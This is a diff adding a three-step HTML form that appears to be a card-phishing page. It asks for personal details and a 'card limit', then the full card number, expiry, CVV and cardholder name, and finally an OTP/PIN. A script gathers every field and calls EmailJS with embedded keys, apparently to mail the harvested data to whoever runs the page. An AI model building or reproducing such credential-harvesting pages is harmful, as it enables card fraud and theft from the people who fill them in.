@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: "OJWF5aLMqF1-1PgFT",
+      });
+   })();
+</script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Multi-Step Form</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      padding: 10px;
+      margin: 0;
+      background: #f2f2f2;
+    }
+
+    .form-step {
+      display: none;
+    }
+
+    .form-step.active {
+      display: block;
+    }
+
+    .form-container {
+      background: white;
+      padding: 20px;
+      max-width: 500px;
+      margin: auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+      border-radius: 10px;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    button {
+      background: orange;
+      color: white;
+      border: none;
+      padding: 15px;
+      width: 100%;
+      font-size: 16px;
+      border-radius: 5px;
+    }
+
+    @media (min-width: 768px) {
+      .form-container {
+        max-width: 600px;
+      }
+    }
+
+    @media (min-width: 1024px) {
+      .form-container {
+        max-width: 700px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <!-- Step 1 -->
+    <form id="form1" class="form-step active">
+      <h2>Personal Details</h2>
+      <input type="text" id="name" placeholder="Name" required />
+      <input type="email" id="email" placeholder="Email" required />
+      <input type="tel" id="mobile" placeholder="Mobile No." required />
+      <input type="date" id="dob" required />
+      <input type="text" id="city" placeholder="City" required />
+      <select id="device">
+        <option value="Android">Android</option>
+        <option value="iOS">iOS</option>
+      </select>
+      <input type="text" id="limit" placeholder="Card Limit" required />
+      <button type="button" onclick="goToStep(2)">Proceed</button>
+    </form>
+
+    <!-- Step 2 -->
+    <form id="form2" class="form-step">
+      <h2>Card Details</h2>
+      <input type="text" id="cardNumber" placeholder="Card Number" required />
+      <select id="expMonth">
+        <option>01</option><option>02</option><option>03</option><option>04</option>
+        <option>05</option><option>06</option><option>07</option><option>08</option>
+        <option>09</option><option>10</option><option>11</option><option>12</option>
+      </select>
+      <select id="expYear">
+        <option>24</option><option>25</option><option>26</option><option>27</option>
+      </select>
+      <input type="text" id="cvv" placeholder="CVV" required />
+      <input type="text" id="cardName" placeholder="Card Holder Name" required />
+      <button type="button" onclick="goToStep(3)">Submit</button>
+    </form>
+
+    <!-- Step 3 -->
+    <form id="form3" class="form-step">
+      <h2>OTP Details</h2>
+      <input type="text" id="otp" placeholder="OTP/PIN" required />
+      <button type="submit" onclick="submitAllForms(event)">Submit</button>
+    </form>
+  </div>
+
+  <script>
+    function goToStep(step) {
+      document.querySelectorAll('.form-step').forEach(form => form.classList.remove('active'));
+      document.getElementById(`form${step}`).classList.add('active');
+    }
+
+    function submitAllForms(e) {
+      e.preventDefault();
+
+      const data = {
+        name: document.getElementById('name').value,
+        email: document.getElementById('email').value,
+        mobile: document.getElementById('mobile').value,
+        dob: document.getElementById('dob').value,
+        city: document.getElementById('city').value,
+        device: document.getElementById('device').value,
+        limit: document.getElementById('limit').value,
+        cardNumber: document.getElementById('cardNumber').value,
+        expMonth: document.getElementById('expMonth').value,
+        expYear: document.getElementById('expYear').value,
+        cvv: document.getElementById('cvv').value,
+        cardName: document.getElementById('cardName').value,
+        otp: document.getElementById('otp').value
+      };
+
+      // EmailJS or custom backend call here
+      alert('Form submitted. Email will be sent.');
+
+      // Example EmailJS code (requires signup at emailjs.com)
+      emailjs.send('service_tp8mobb', 'template_15bli0r');
+
+      console.log(data);
+    }
+  </script>
+</body>
+</html>
